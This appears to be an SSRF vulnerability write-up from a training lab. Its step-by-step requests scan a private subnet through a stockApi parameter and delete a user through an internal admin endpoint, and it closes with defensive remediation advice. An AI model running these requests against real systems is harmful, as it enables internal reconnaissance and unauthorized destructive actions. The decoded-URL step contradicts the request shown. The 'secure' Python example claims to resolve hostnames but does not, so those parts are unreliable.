# Vulnerability Report: Server-Side Request Forgery (SSRF) Leading to Internal Subnet Scanning and Remote Code/Action Execution

* **Vulnerability Type:** Server-Side Request Forgery (SSRF) (CWE-918) / Unauthenticated Internal Interface Access (CWE-306)

* **Severity:** High

* **Target Component:** Stock Check API (`/product/stock` via `stockApi` parameter)

* **OWASP Top 10 Mapping:** A10:2021 – Server-Side Request Forgery (SSRF)

## 1. Executive Summary

A critical Server-Side Request Forgery (SSRF) vulnerability was identified in the application's stock-checking interface. By manipulating the backend data-fetching mechanism via the `stockApi` parameter, an unauthenticated attacker can use the application server as a proxy to perform internal network reconnaissance. This enables port and host scanning across private subnet ranges (`192.168.0.0/24`) that are inaccessible from the public internet, leading to the discovery of an unprotected internal administrative portal and unauthorized user account deletion.

## 2. Technical Analysis & Root Cause

The web application accepts a fully qualified URL parameter (`stockApi`) from the client, decodes it, and executes an HTTP request to the specified target. The backend server acts as a network bridge between the public internet and an unsegmented internal microservices network (`192.168.0.x`).

### Internal Network Reconnaissance Vector

```
[ Attacker ] 
     |
     | 1. POST /product/stock (stockApi=http://192.168.0.§1-255§:8080/)
     v
[ Web Application Server ]
     |
     +--- (Internal Probe) ---> [ 192.168.0.1:8080 ]   (500 Error / Connection Refused)
     +--- (Internal Probe) ---> [ 192.168.0.2:8080 ]   (500 Error / Connection Refused)
     +--- (Internal Probe) ---> [ 192.168.0.X:8080 ]   (200 OK / 404 Found -> Target Active)


```

Because internal services hosted on port `8080` assume safety behind the network perimeter, they lack session authentication and authorization controls. Consequently, any HTTP request originating from the web server is implicitly trusted by internal back-end hosts.

## 3. Proof of Concept (PoC)

1. Intercept a stock check request using Burp Suite:

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http%3A%2F%2Fstock.welsh-king.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
   
   
   ```

2. URL-decode the `stockApi` parameter to expose the underlying endpoint structure:
   `stockApi=http://192.168.0.1:8080/`

3. Send the request to **Burp Intruder** to perform automated internal host discovery:

   * Target Payload Marker: `stockApi=http://192.168.0.§1§:8080/admin`

   * Payload Type: Numbers (`1` to `255`, Step: `1`)

4. Analyze response status codes and content lengths. Most addresses return `500 Internal Server Error` (Connection Refused), while a specific host (e.g., `192.168.0.X`) responds with `200 OK` or `404 Not Found`, confirming an active internal administrative service.

5. Issue an HTTP request targeting the discovered host's administrative interface:

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://192.168.0.X:8080/admin
   
   
   ```

6. Append the user deletion command parameter to execute the administrative action:

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
   
   
   ```

7. **Result:** The web server proxies the request to the internal system on `192.168.0.X:8080`, deleting user `carlos` and returning `HTTP 200 OK`.

## 4. Impact

* **Internal Network Scanning:** Enables attackers to map out hidden network topology, active IP addresses, open ports, and microservice architectures behind the firewall.

* **Bypass of Perimeter Security:** Direct exposure of non-public services, legacy APIs, and management portals that rely on network isolation rather than strong authentication.

* **Unauthorized Action Execution:** Full administrative compromise of back-end microservices, allowing unauthorized access, modification, or deletion of system resources.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Network-Level Segregation and Firewalls:**
   Restrict outgoing connections from the web server. Configure firewall rules so the public-facing application can only communicate with explicitly required internal API endpoints on specified ports.

2. **Strict URL Parsing & Domain Allowlisting:**
   Do not allow users to specify arbitrary domain names or IP addresses in backend requests. Enforce a server-side allowlist of permitted destinations and reject requests pointing to private IP space (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`).

3. **Zero Trust Authentication Architecture:**
   Enforce strict token-based authentication (e.g., OAuth2, JWT, or Mutual TLS) on all internal microservices. Back-end APIs must never rely solely on network location for access control.

#### Secure Implementation Example (Python / IP Address Validation)

```
import ipaddress
import urllib.parse
import requests

def validate_and_fetch(user_url):
    parsed = urllib.parse.urlparse(user_url)
    hostname = parsed.hostname
    
    # Resolve and validate IP to prevent internal network scanning
    ip_addr = ipaddress.ip_address(hostname)
    if ip_addr.is_private or ip_addr.is_loopback:
        raise PermissionError("Access to internal or private IP addresses is blocked.")
        
    response = requests.get(user_url, timeout=3, allow_redirects=False)
    return response.text


```

## 6. References

* **CWE-918:** [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

* **CWE-306:** [Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

* **OWASP:** [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)